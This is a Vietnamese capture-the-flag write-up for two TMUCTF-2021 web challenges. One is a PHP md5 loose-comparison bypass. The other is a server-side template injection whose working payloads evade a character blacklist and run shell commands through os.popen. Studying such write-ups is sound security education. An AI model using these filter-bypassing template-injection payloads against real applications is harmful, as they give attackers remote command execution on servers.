# TMUCTF-2021 (Web challenges)
## Login
Ban đầu mình thử với một vài payload sqli nhưng không phải.

Thử check file robots.txt chúng ta sẽ có được source code:
```
if (isset($_GET["password"])) {
    if (hash("md5", $_GET["password"]) == $_GET["password"]) {
        echo "<h1>Here is the flag:</h1>" . $flag;
    } else {
        echo "Try harder!";
    }
}
```

Bài này thực hiện so sánh password do chúng ta nhập với md5 hash của nó. Nếu như kết quả giống nhau thì sẽ echo ra flag.

Lợi dụng Loose comparison trong PHP để giải quyết vấn đề này.

password: 0e215962017

### Flag: TMUCTF{D0_y0u_kn0w_7h3_d1ff3r3nc3_b37w33n_L0053_c0mp4r150n_4nd_57r1c7_c0mp4r150n_1n_PHP!?}

## Injection
### Dạng bài: server-side templete injection 

Điều khó khăn nhất trong bài này chính là đề bài không cung cấp blacklist cho chúng ta nên chúng ta không thể soạn một payload hoàn chỉnh ngay được

Sau một vài lần thử thì mình có thể biết được: các kí tự: '_', request, '.','[' đều bị filter:

* `__` có thể được thay thế bằng `\x5f\x5f`

* `.` và `[` có thể sử dụng `|attr để thay thế`
 
 Hiển thị tất cả class:
 ```
 {{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}}
 ```
 Đến đây có thể tìm được ví trí của class mình cần, mình tìm được vị trí của class `os._wrap_close` là 132
 
 Get class `os._wrap_close`:
 ```
 {{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)
 ```
 
 Cứ lần lượt như vậy mình có được payload:
 
 ```
 {{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
 ```
 Nhưng đây chưa phải là payload cuối cùng mình có thể sử dụng vì os, popen và khoảng trắng đều bị filter:
 
 * Thay `'os'` bằng `'\x6f\x73'`
 
 * Thay `'popen'` bằng `'pop''en'`
 
 * Thay khoảng trằng băng ${IFS}
 
 Finally, chúng ta đã có thể excute được command.
 
 ```
 {{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('\x6f\x73')|attr('po''pen')('cat${IFS}/opt/tmuctf/*')|attr('read')()}}
 ```
 
 Trong bài này việc tìm flag cũng có đôi chút khó khăn, flag không nằm trong những file 'flag.txt' hay nằm sẵn ở dạng TMUCTF{}.
 
 Mình mất khá nhiều thời gian để tìm được path chứa flag. Cuối cùng mình thử cat file help thì được hint là flag là file cuối cùng được upload trong /opt/tmuctf/
 
 `ls${IFS}-t` để sắp xếp file theo thời gian
 
 Sau đó cat file và base64-decode nội dung sẽ được flag:
 
 ### Flag: TMUCTF{0h!_y0u_byp4553d_4ll_my_bl4ckl157!!!__1_5h0uld_h4v3_b33n_m0r3_c4r3ful}
 
 



